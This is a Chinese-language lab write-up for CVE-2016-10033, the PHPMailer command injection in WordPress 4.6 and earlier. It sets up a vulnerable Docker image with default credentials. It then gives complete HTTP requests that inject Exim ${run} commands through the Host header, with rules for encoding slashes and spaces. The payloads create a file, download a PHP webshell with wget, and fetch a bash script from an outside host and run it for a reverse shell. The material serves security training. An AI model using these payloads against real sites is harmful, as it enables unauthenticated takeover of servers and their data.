## WordPress <= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)

### 漏洞信息

 WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 < 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。

### 影响版本

WordPress <= 4.6

### 镜像信息

类型 | 用户名 | 密码
:-:|:-:|:-:
Mysql | root | root
/wp-admin/ | admin | admin123

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:w_wordpress_6
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:w_wordpress_6
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

 访问 http://127.0.0.1:8000 看到 WordPress 主界面代表启动成功


### POC

> 假如目标地址为： http://127.0.0.1:8000/

1. 把下面的HTTP报文复制到 BurpSuite Repeater 中，点击 Go 按钮，填写目标 IP 和 端口（例如, IP填 127.0.0.1 端口填 80）

```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}vuln}} null)
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

2. 访问：http://127.0.0.1:8000/vuln

看到返回状态码为 200 代表已经成功创建了 `/var/www/html/vuln` 文件

> 可在发包之前访问该地址，会出现 404

### Exp

思路： 在远程 HTTP 服务器上创建一个文本文件，通过 `wget` 下载到目标机器上

#### 向目标写 WebShell（强烈不推荐）

> 都能命令执行了，还传什么 WebShell

1. 执行命令如下：

```
/usr/bin/wget --output-document /var/www/html/webshell.php raw.githubusercontent.com/medicean/vulapps/master/w/wordpress/6/webshell.php
```

> 注意： 
> 1. 远程 URL 中不要有 `http://`
> 2. 所有字母必须小写
> 3. 所有 / 用 `${substr{0}{1}{$spool_directory}}` 代替
> 4. 所有 空格 用 `${substr{10}{1}{$tod_log}}` 代替

报文如下(根据实际情况替换 user_login, 默认是 admin)：

```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}webshell.php${substr{10}{1}{$tod_log}}raw.githubusercontent.com${substr{0}{1}{$spool_directory}}medicean${substr{0}{1}{$spool_directory}}vulapps${substr{0}{1}{$spool_directory}}master${substr{0}{1}{$spool_directory}}w${substr{0}{1}{$spool_directory}}wordpress${substr{0}{1}{$spool_directory}}6${substr{0}{1}{$spool_directory}}webshell.php}} null)
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

2. 访问 http://127.0.0.1:8000/webshell.php

#### 反弹 Shell（推荐）

远程文本文件内容如果是 bash 脚本，可在下载到目标后，直接用 `/bin/bash` 来执行该文件

1. 下载bash脚本到目标

```
/usr/bin/wget --output-document /tmp/rce example.com/1.txt
```

2. 执行

```
/bin/bash /tmp/rce
```

### 相关链接

* [WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
